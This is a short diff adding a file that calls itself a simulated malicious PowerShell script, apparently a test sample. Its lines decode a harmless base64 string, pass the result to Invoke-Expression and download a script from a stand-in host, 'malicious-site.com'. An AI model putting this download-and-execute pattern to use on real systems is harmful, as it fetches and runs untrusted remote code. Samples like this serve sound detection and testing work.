@@ -1,0 +1,4 @@
+This file simulates a malicious PowerShell script:
+$payload = [System.Convert]::FromBase64String("aGVsbG8gd29ybGQ=")
+Invoke-Expression $payload
+(New-Object Net.WebClient).DownloadString("http://malicious-site.com/script")
